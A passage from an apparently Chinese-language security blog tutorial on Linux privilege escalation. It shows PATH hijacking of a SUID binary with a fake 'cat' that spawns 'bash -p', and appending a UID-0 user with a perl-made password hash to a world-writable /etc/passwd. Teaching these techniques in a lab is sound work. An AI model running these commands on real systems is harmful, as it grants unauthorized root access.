+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>看到有这个demo文件，伪造cat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash -p&quot; &gt; cat</span><br><span class="line">chmod 777 cat</span><br></pre></td></tr></table></figure>
+
+<p>并修改环境变量，让程序去执行cat的时候先执行我们伪造的cat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=~/Desktop:$PATH     #将tmp目录添加环境变量echo $PATH</span><br></pre></td></tr></table></figure>
+
+<p>直后执行就可以拿到root权限</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260725211046678.png"
+                        alt="image-20260725211046678"
+                 ></p>
+<h3 id="etc-passwd-提权"><a href="#etc-passwd-提权" class="headerlink" title="&#x2F;etc&#x2F;passwd 提权"></a>&#x2F;etc&#x2F;passwd 提权</h3><p>利用系统管理员配置错误，导致普通用户对 <code>/etc/passwd</code> 文件拥有<strong>可写权限</strong>（如 <code>rw-rw-rw-</code>）。攻击者通过向该文件直接追加一个 UID 为 0 的新用户，或修改现有 root 用户的密码字段，从而获取系统最高权限。</p>
+<p><strong>环境伪造</strong></p>
+<p>给&#x2F;etc&#x2F;passwd文件赋予读写权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 666 /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>攻击</p>
+<blockquote>
+<p><strong>系统底层不比对明文</strong> Linux 的身份验证程序（如 <code>su</code> 或 <code>login</code>）在底层校验时，采用的是<strong>单向哈希（Hash）比对</strong>机制，它从来不直接拿输入的字符和文件里的字符划等号。</p>
+<p><strong>如果直接放明文会发生什么？</strong></p>
+<ul>
+<li>假设在 <code>/etc/passwd</code> 里直接写入明文：<code>test:123456:0:0...</code></li>
+<li>终端登录 <code>su test</code>，手动输入密码：<code>123456</code>。</li>
+<li><strong>系统处理逻辑</strong>：系统会把输入的 <code>123456</code> 用哈希算法加密，算出一串密文（例如 <code>x8f9a2b...</code>）。</li>
+<li><strong>比对失败</strong>：系统拿算出来的密文 <code>x8f9a2b...</code> 去跟文件里存的 <code>123456</code> 进行字符串对比。显然不相等，直接提示密码错误。</li>
+</ul>
+<p><strong>为什么要先算好密文再写入？</strong> 写入 <code>/etc/passwd</code> 的必须是<strong>加密后的结果</strong>。 你用 Perl 或 OpenSSL，就是在做“提前加密”的工作。把算好的密文写进文件，等你登录时输入明文，系统一加密，刚好和文件里的密文对上，才能认证成功。</p>
+</blockquote>
+<p>先是计算密文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;password@123&quot;, &quot;addedsalt&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>写入&#x2F;etc&#x2F;passwd文件中</p>
+<p>之后进入test账户就好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260725212953352.png"
+                        alt="image-20260725212953352"
+                 ></p>
+<blockquote>
+<p>切为test账户时</p>
+<p><code>test:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash</code>。它严格以冒号 <code>:</code> 为分隔符，将这行文本切分成 7 段。</p>
+<p><strong>提取身份标识</strong>：系统按顺序去读<strong>第三段</strong>文本。因为你写入的是 <code>0</code>，系统就读取到整数 <code>0</code>，并将其作为该用户的 UID。</p>
+</blockquote>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Linux%E6%8F%90%E6%9D%83/">Linux提权</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2026/08/16/%E8%93%9D%E7%89%99/"
+                                   title="车联网之蓝牙协议"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">车联网之蓝牙协议</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/07/23/CNVD-2026-28535%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%86%E4%BA%AB/"
+                                   title="CNVD-2026-28535漏洞挖掘分享"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">CNVD-2026-28535漏洞挖掘分享</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="giscus-comments-container">
+        <div class="giscus" id="giscus"></div>
+        <script 
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          if (!window.KeepCommentPlugin?.getGiscusTheme) {
+            window.KeepCommentPlugin.getGiscusTheme = () => {
+              return document.documentElement.classList.contains('dark-mode') ? 'dark_dimmed' : 'light_tritanopia'
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.changeGiscusTheme) {
+            window.KeepCommentPlugin.changeGiscusTheme = () => {
+              const iframe = document.querySelector('iframe.giscus-frame')
+              iframe && iframe.contentWindow.postMessage({
+                giscus: {
+                  setConfig: {
+                    theme: window.KeepCommentPlugin.getGiscusTheme()
+                  }
+                }
+              }, 'https://giscus.app')
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.initGiscus) {
+            window.KeepCommentPlugin.initGiscus = () => {
+              const script = document.createElement('script')
+              script.async = true
+              script.src = 'https://giscus.app/client.js'
+              script.setAttribute('data-repo', 'zach0ry-zzh/zach0ry-zzh.github.io')
+              script.setAttribute('data-repo-id', 'R_kgDOPKvC2Q')
+              script.setAttribute('data-category', 'Comments')
+              script.setAttribute('data-category-id', 'DIC_kwDOPKvC2c4DByYU')
+              script.setAttribute('data-reactions-enabled', '1')
+              script.setAttribute('data-lang', 'en')
+              script.setAttribute('data-mapping', 'pathname')
+              script.setAttribute('data-strict', '0')
+              script.setAttribute('data-emit-metadata', '0')
+              script.setAttribute('data-input-position', 'top')
+              script.setAttribute('crossorigin', 'anonymous')
+              script.setAttribute('loading', 'lazy')
+              script.setAttribute('data-theme', window.KeepCommentPlugin.getGiscusTheme())
+              document.querySelector('.giscus-comments-container').appendChild(script)
+              script.onerror = () => {
+                window.KeepCommentPlugin.loadFailHandle()
+              }
+              script.onload = () => {
+                window.KeepCommentPlugin.hideLoading()
+              }
+              const toggleThemeBtn = document.querySelector('.tool-toggle-theme-mode')
+              toggleThemeBtn && toggleThemeBtn.addEventListener('click', () => {
+                window.KeepCommentPlugin.changeGiscusTheme()
+              })
+            }
+          }
+
+          if ('false' === "true") {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGiscus()
+            }, 1000)
+          } else {
+            window.addEventListener("DOMContentLoaded", window.KeepCommentPlugin.initGiscus)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#suid%E6%8F%90%E6%9D%83"><span class="nav-text">suid提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eg-find%E6%8F%90%E6%9D%83"><span class="nav-text">eg:find提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="nav-text">sudo提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eg-python%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90"><span class="nav-text">eg:python可执行权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-text">内核漏洞提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cronjobs%E6%8F%90%E6%9D%83"><span class="nav-text">Cronjobs提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83"><span class="nav-text">通配符提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crontab-%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%8F%90%E6%9D%83"><span class="nav-text">Crontab 文件覆盖提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="nav-text">环境变量提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#suid%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8"><span class="nav-text">suid文件调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#etc-passwd-%E6%8F%90%E6%9D%83"><span class="nav-text">&#x2F;etc&#x2F;passwd 提权</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2025</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Zach0ry</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#suid%E6%8F%90%E6%9D%83"><span class="nav-text">suid提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eg-find%E6%8F%90%E6%9D%83"><span class="nav-text">eg:find提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="nav-text">sudo提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eg-python%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90"><span class="nav-text">eg:python可执行权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-text">内核漏洞提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cronjobs%E6%8F%90%E6%9D%83"><span class="nav-text">Cronjobs提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83"><span class="nav-text">通配符提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crontab-%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%8F%90%E6%9D%83"><span class="nav-text">Crontab 文件覆盖提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="nav-text">环境变量提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#suid%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8"><span class="nav-text">suid文件调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#etc-passwd-%E6%8F%90%E6%9D%83"><span class="nav-text">&#x2F;etc&#x2F;passwd 提权</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
